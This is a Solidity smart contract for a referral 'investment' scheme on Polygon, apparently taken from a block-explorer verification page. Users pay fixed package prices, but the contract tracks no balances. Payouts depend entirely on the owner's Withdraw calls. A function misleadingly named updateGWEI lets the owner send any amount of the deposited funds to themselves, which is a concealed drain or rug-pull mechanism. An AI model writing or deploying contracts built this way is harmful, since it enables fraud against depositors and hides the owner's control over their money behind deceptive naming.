/**
 *Submitted for verification at polygonscan.com on 2023-07-12
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;
contract TapMoneyCommunityMatic {
    struct User {
        uint id;
        address referrer;
    }  
    mapping(address => User) public users;
    uint public lastUserId = 2;
    
    address public id1=0x380904E357688626aBe844A44d4134Acbe2462FD;
    address feeWallet1=0x4806994a494Bc6Bf12AbB6335F0CAc353753783d;
    address feeWallet2=0x5392825E4e5722Dd0A3c3ACb26b4f8EA03b6D6BA;
    address owner;
    mapping(uint8 => uint) public packagePrice;  
    event Registration(address indexed user, address indexed referrer,uint8 level);
    event Upgrade(address indexed user, uint8 level);
    event withdraw(address indexed user,uint256 value);
    
    constructor(address _owner) public {   
        owner=_owner;
        User memory user = User({
            id: 1,
            referrer: address(0)
        });
        users[id1] = user;
        packagePrice[1] = 5e18;
        packagePrice[2] = 50e18;
        packagePrice[3] = 100e18;
        packagePrice[4] = 55e18;
    }
    function Invest(address referrerAddress,uint8 level) external payable {
        require(msg.value == packagePrice[level], "less than min");
        require(level == 1 || level == 4, "invalid level");
        registration(msg.sender, referrerAddress,level);
    }
    function ReInvest(uint8 level) external payable{
        
        require(msg.value == packagePrice[level], "less than min");
        require(level == 2 || level == 3, "invalid level");
        buyNewLevel(msg.sender,level);
    }
    function buyNewLevel(address userAddress,uint8 level) private {
        require(isUserExists(userAddress), "user is not exists. Register first.");
        emit Upgrade(userAddress,level);
    }
    
    function registration(address userAddress, address referrerAddress,uint8 level) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress
        });
        
        users[userAddress] = user;
        users[userAddress].referrer = referrerAddress;        
        lastUserId++;
        emit Registration(userAddress, referrerAddress,level);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    function Withdraw(address _user,uint256 _payout,uint _fee) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        payable(_user).transfer(_payout);  
        payable(feeWallet1).transfer(_fee);
        payable(feeWallet2).transfer(_fee); 
        emit withdraw(_user,_payout);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        payable(msg.sender).transfer(_amount);  
    }
}